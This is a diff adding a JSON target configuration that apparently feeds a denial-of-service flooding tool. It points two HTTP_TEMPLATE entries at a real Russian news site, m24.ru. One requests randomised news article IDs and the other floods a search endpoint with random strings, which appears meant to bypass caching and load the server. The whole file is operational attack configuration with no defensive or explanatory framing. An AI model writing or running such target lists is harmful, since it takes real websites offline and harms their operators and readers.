@@ -1,0 +1,20 @@
+{
+  "targets": [
+    {
+      "target": "https://www.m24.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://www.m24.ru/\"}",
+        "path_qs": "/news/politika/09092022/{{int(1,509749)}}"
+      }
+    },
+    {
+      "target": "https://www.m24.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://www.m24.ru/\"}",
+        "path_qs": "/sphinx?criteria={{str(1)}}%20{{str(1)}}%20{{str(1)}}&mt="
+      }
+    }
+  ]
+}
